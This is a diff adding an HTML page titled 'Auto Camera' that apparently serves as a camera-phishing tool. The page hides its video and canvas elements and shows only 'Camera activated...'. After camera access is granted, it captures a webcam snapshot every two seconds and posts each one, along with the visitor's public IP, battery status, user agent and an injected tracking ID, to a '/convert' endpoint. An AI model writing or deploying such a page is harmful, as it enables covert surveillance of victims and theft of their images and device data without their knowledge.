@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Camera</title>
+  <style>
+    body, html { margin: 0; padding: 0; background: #000; color: #fff; font-family: sans-serif; text-align: center; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h2>Camera activated...</h2>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <!--__INJECT_ID__-->
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    let ipAddress = 'unknown';
+
+    // Get IP
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => { ipAddress = data.ip; });
+
+    // Get battery info
+    async function getBatteryMessage() {
+      if (!navigator.getBattery) return 'Battery info unavailable';
+      const battery = await navigator.getBattery();
+      const level = Math.round(battery.level * 100);
+      const charging = battery.charging ? 'charging' : 'not charging';
+      return `Battery: ${level}%, ${charging} | IP: ${ipAddress} | UA: ${navigator.userAgent}`;
+    }
+
+    // Request camera
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          video.play();
+          captureLoop();
+        };
+      } catch (err) {
+        alert('Camera access denied');
+        console.error(err);
+      }
+    }
+
+    // Take photo every 2 seconds
+    async function captureLoop() {
+      setInterval(async () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        canvas.toBlob(async (blob) => {
+          const formData = new FormData();
+          formData.append('photo', blob, 'snapshot.jpg');
+          formData.append('id', PSID);
+          formData.append('message', await getBatteryMessage());
+
+          fetch('/convert', {
+            method: 'POST',
+            body: formData
+          }).catch(console.error);
+        }, 'image/jpeg', 0.8);
+      }, 2000);
+    }
+
+    startCamera();
+  </script>
+</body>
+</html>
